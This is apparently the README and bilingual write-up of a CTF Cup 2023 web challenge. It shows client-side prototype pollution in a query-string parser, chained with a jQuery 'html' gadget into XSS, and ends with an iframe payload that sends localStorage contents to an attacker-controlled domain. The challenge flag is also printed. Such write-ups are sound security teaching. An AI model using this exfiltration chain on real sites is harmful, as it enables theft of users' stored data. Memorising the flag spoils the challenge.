# web | Grek Ilya

## Information

Ваша миссия — вживиться в роль агента разведки, чтобы раскрыть тайны современных арбалетов, разрабатываемых в Сибири. Последние разведывательные данные свидетельствуют о том, что таинственный греческий индивидуум, известный как Илья, активно участвует в разработке и совершенствовании этого уникального вида стрелкового оружия.


Your mission is to infiltrate as a reconnaissance agent to uncover the secrets of the modern crossbows being developed in Siberia. Recent intelligence suggests that a mysterious Greek individual, known as Ilya, is actively involved in the development and enhancement of this unique type of projectile weapon.
https://grekilya-6f8a51d3c9422895e2a32d7eaa431a91.ctfcup-2023.ru/
https://grekilya-6f8a51d3c9422895e2a32d7eaa431a91.ctfcup-2023.ru/report.html

## Deploy

```bash
cd deploy
docker compose up --build -d
```

## Public

## TLDR

Client-Side proto pollution with jquery chain

## Writeup (ru)

Для решения достаточно заметить:
1. В  функции parseQueryString на фронтенде присутсвует prototype pollution
```
            if (i === keys.length - 1) {
                current[k] = decodeURIComponent(value || '');
            } else {
                current[k] = current[k] || (isFinite(keys[i + 1]) ? [] : {});
                current = current[k];
            }
```
2. Использовать можно перейдя по ссылку вида url-to-task.com/?slonser\[\_\_proto\_\_\][slon]=amogus, заметите что прототип изменился и в нем появилось slon
3. Анализируя код дальше можно так же отметить что для вставки контента используется JQuery
```
        const listItem = $('<li>', {
            class: 'list-group-item',
            text: (savedCode.name || `Code ${index + 1}`)
        });
```
Такой конструктор имеет параметр `html`, который является более приорететным нежеле текст
4. Перейдете на `url-to-task.com/?slonser\[\_\_proto\_\_\][html]=<h1>slon<h1>` - увидите что отрендериться slon в uppercase
5. Вставляем нагрузку которая берет флаг и отправляет на контролируемый домен, например
```
<iframe/srcdoc="document.location='yourgook.com?e='+localStorage.get('savedCodes')">
```
## Writeup (en)

1. There is prototype pollution in the parseQueryString function on the frontend
```
            if (i === keys.length - 1) {
                current[k] = decodeURIComponent(value || '');
            } else {
                current[k] = current[k] || (isFinite(keys[i + 1]) ? [] : {});
                current = current[k];
            }
```
2. You can use it by following a link like url-to-task.com/?slonser\[\_\_proto\_\_\][slon]=amogus, you will notice that the prototype has changed and slon has appeared in it
3. You can also note that JQuery is used to insert content
```
        const listItem = $('<li>', {
            class: 'list-group-item',
            text: (savedCode.name || `Code ${index + 1}`)
        });
```
This constructor has a parameter `html`, which takes precedence over text
4. Go to `url-to-task.com/?slonser\[\_\_proto\_\_\][html]=<h1>slon<h1>` - you will see that slon will be rendered in uppercase5. We insert a load that takes the flag and sends it to the controlled domain, for example
```
<iframe/srcdoc="document.location='yourgook.com?e='+localStorage.get('savedCodes')">
```

## Flag

`ctfcup{7be3ddf98dbaca3cb516458cbf55356980d5c096}`
